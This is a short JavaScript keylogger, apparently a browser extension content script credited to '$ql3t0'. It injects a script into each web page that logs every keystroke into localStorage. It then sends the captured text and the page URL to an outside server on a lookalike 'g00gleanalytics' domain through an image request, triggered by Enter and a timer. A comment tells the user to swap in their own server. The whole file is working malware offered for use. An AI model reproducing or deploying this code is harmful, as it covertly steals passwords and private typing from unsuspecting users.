//########################
//# developed by $ql3t0  #
//########################

document.body.setAttribute("onkeypress","getKeyCode(event)");
var tag = document.createElement('script');
//change the url in the code below to the url of your server
var txt = document.createTextNode('window.setInterval(sendKeys(), 10000); function sendKeys(){ var keys = localStorage.getItem("log_Extension"); var size = keys.length; if(size > 4) { new Image().src="https://g00gleanalytics.000webhostapp.com/logs.php?values="+keys+"<br/>"+document.URL; localStorage.removeItem("log_Extension");} } function getKeyCode(event) { var x = event.keyCode || event.which ; switch(x) { case 30: alert(localStorage.getItem("log_Extension")); break; case 0: alert("All LOGs Clear- OK"); localStorage.removeItem("log_Extension"); break; case 10: x = "[ENTER]"; sendKeys(); break; case 13: x = "[ENTER]"; sendKeys(); break; } var txt = ""; txt = txt.concat(localStorage.getItem("log_Extension")); if(isNaN(x)){ var result = txt.concat(x); }else{ var result = txt.concat(String.fromCharCode(x)); } localStorage.setItem("log_Extension", result); }');
tag.appendChild(txt);
document.body.appendChild(tag);


